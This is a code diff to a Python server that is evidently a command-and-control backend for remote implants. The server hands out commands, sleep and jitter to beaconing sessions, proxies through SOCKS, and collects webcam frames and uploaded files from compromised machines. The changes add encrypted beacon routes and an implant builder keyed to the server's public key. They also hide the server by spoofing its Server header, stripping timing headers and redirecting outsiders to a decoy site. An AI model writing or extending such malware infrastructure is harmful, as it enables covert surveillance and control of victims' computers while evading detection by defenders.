@@ -27,14 +27,16 @@ import uvicorn
 
 import config
 import tools
-from crypto import Box
+from crypto import Box, ServerKey
 from builder import Builder, BuildError
 from socks import HUB, start_socks
 
 BASE = os.path.dirname(os.path.abspath(__file__))
 CFG = config.load()
-BOX = Box(bytes.fromhex(CFG["psk_hex"]))
-BUILDER = Builder(CFG["builder"], CFG["psk_hex"], CFG["public_url"])
+SERVER_KEY = ServerKey(os.path.join(CFG["data_dir"], "x25519.key"))
+BOX = Box(bytes.fromhex(CFG["psk_hex"]), SERVER_KEY)
+BUILDER = Builder(CFG["builder"], CFG["psk_hex"], CFG["public_url"],
+                  server_pub=SERVER_KEY.pub_hex())
 
 BLOB_DIR = os.path.join(CFG["data_dir"], "blobs")
 os.makedirs(BLOB_DIR, exist_ok=True)
@@ -161,7 +163,7 @@ async def broadcast(msg):
 
 # ---------------------------------------------------------------- auth
 
-OPEN_PATHS = ("/beacon", "/socks/", "/api/media/push", "/api/media/upload",
+OPEN_PATHS = ("/v2/", "/beacon", "/socks/", "/api/media/push", "/api/media/upload",
               "/healthz", "/login", "/js/", "/style.css", "/views.css",
               "/favicon.svg", "/favicon.ico", "/api/login")
 TOKEN_COOKIE = "phantom_auth"
@@ -221,7 +223,21 @@ async def guard(request: Request, call_next):
         # update is picked up on the next load instead of a stale bundle
         if path == "/" or path.startswith(("/style.css", "/views.css", "/js/", "/login.js")):
             response.headers["Cache-Control"] = "no-cache"
+        # a bare "uvicorn" banner names the stack; present as a plain web server
+        response.headers["Server"] = CFG["cover"]["server"]
+        if "x-process-time" in response.headers:
+            del response.headers["x-process-time"]
+        if path.startswith(("/v2/", "/beacon")):
+            response.headers["Content-Type"] = "application/octet-stream"
+            response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
         return response
+
+    # optional cover: a stranger poking at the root sees a normal site, the
+    # operator (with a session cookie) lands on the dashboard
+    if path == "/" and CFG["cover"]["url"] and "text/html" in request.headers.get("accept", ""):
+        if not _authorized(request.headers, request.query_params.get("token", ""),
+                           request.cookies):
+            return _finalize(RedirectResponse(CFG["cover"]["url"], 302))
 
     if path.startswith(OPEN_PATHS):
         return _finalize(await call_next(request))
@@ -397,10 +413,17 @@ def _fanout(subs, data):
 
 
 @app.post("/api/media/push")
+@app.post("/v2/{tok}/push")
 async def media_push(request: Request, sid: str = "", kind: str = "cam",
-                     seq: int = 0, fmt: str = "jpeg"):
+                     seq: int = 0, fmt: str = "jpeg", tok: str = ""):
     s = SESSIONS.get(sid)
     data = await request.body()
+    hdr = request.headers.get("x-p", "")
+    if hdr:
+        try:
+            data = BOX.open_any(data, hdr)
+        except Exception:
+            return {"ok": False}
     if not s or not data:
         return {"ok": False}
     if kind == "cam":
@@ -491,15 +514,26 @@ def _safe_blob(name: str) -> str:
 
 
 @app.post("/api/media/upload")
+@app.post("/v2/{tok}/upload")
 async def media_upload(request: Request, sid: str = "", kind: str = "file",
-                       name: str = ""):
+                       name: str = "", tok: str = ""):
     s = SESSIONS.get(sid)
     data = await request.body()
+    hdr = request.headers.get("x-p", "")
+    if hdr:
+        try:
+            data = BOX.open_any(data, hdr)
+        except Exception:
+            return {"ok": False}
     if not s or not data:
         return {"ok": False}
     fname = f"{uuid.uuid4().hex[:12]}-{_safe_blob(name)}"
-    with open(os.path.join(BLOB_DIR, fname), "wb") as fh:
-        fh.write(data)
+
+    def _write() -> None:
+        with open(os.path.join(BLOB_DIR, fname), "wb") as fh:
+            fh.write(data)
+
+    await asyncio.to_thread(_write)
     ext = os.path.splitext(fname)[1].lower()
     entry = {"url": f"/api/blobs/{fname}", "name": os.path.basename(name or fname),
              "kind": kind, "size": len(data), "media": MEDIA_TYPES.get(ext, ""),
@@ -524,10 +558,12 @@ async def get_blob(name: str):
 # ---------------- beacon ----------------
 
 @app.post("/beacon")
-async def beacon(request: Request):
+@app.post("/v2/{tok}/beacon")
+async def beacon(request: Request, tok: str = ""):
     raw = await request.body()
+    hdr = request.headers.get("x-p", "")
     try:
-        data = json.loads(BOX.open(raw))
+        data = json.loads(BOX.open_any(raw, hdr))
     except Exception:
         return Response(b"", status_code=400)
 
@@ -590,7 +626,7 @@ async def beacon(request: Request):
     s.queue = []
     touch()
     resp = {"session_id": sid, "sleep": s.sleep, "jitter": s.jitter, "commands": cmds}
-    return Response(BOX.seal(json.dumps(resp).encode()),
+    return Response(BOX.seal_any(json.dumps(resp).encode(), hdr),
                     media_type="application/octet-stream")
 
 
@@ -1111,6 +1147,8 @@ def main():
         timeout_keep_alive=75,
         ws_ping_interval=20,
         ws_ping_timeout=20,
+        # the middleware sets its own Server header; uvicorn's would duplicate it
+        server_header=False,
     )
     if use_tls:
         uvicorn_cfg["ssl_certfile"] = tls["cert"]
